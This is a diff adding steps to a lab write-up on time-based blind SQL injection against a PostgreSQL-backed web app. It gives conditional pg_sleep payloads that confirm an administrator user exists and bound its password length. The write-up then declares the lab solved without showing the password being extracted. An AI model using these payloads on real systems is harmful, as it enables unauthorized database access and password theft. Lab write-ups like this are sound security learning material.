@@ -58,5 +58,26 @@ I tested payloads using different database-specific time-delay techniques and st
 ![Payload 4](img/07-payload4.png)  
 The third payload caused a noticeable delay, with a response time of 10,237 milliseconds.  
 ![Time delay](img/08-time-delay.png)    
+So I used `pg_sleep(10)` to attack.  
+
+### 3. Confirm that `users` table and `administrator` user exist   
+I injected:  
+```text
+'||(SELECT CASE WHEN(username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+```
+The response slept 10 seconds, so `users` table and `administrator` user exist    
+
+### 4. Identify the password length  
+I injected 2 payloads: 
+```text
+'||(SELECT CASE WHEN(username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+```
+The response slept 10 seconds   
+```text
+'||(SELECT CASE WHEN(username='administrator' AND LENGTH(password)>30) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
+```
+This time, it did not sleep at all  
+Therefore, `1<the password length<=30`
+
 And the lab was solved  
 ![Lab solved](img/09-lab-solved.png)  
